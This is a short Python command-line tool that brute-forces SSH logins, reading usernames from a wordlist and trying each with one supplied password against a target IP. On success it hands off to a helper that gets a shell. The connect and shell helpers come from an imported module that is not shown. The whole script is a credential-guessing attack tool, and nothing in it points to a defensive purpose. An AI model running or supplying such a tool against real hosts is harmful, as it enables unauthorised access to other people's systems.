#!/usr/bin/python3

from pexpect import pxssh
import argparse
import time

from ssh_connect import *

def main_u():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip", help="Specify Target ip")
	parser.add_argument("file", help="Specify wordlist file")
	parser.add_argument("passwd", help="Specify password")

	args = parser.parse_args()

	if args.ip and args.file and args.passwd:

		with open(args.file, 'r') as lines:

				startTime = time.time()
				
				for line in lines: # reading a line from lines in file
					user = line.strip("\r\n")

					print(color_obj.WHITE+"[*] Testing: ", str(user)+":"+args.passwd+color_obj.ENDC)

					conn = connect(args.ip, user, args.passwd) # ssh connect


					# Getting shell after connecting to ssh 
					shell_getting(user, args.ip, conn, startTime)

	else:
		print(parser.usage)
		exit(0)



if __name__ == '__main__': 

	main_u()
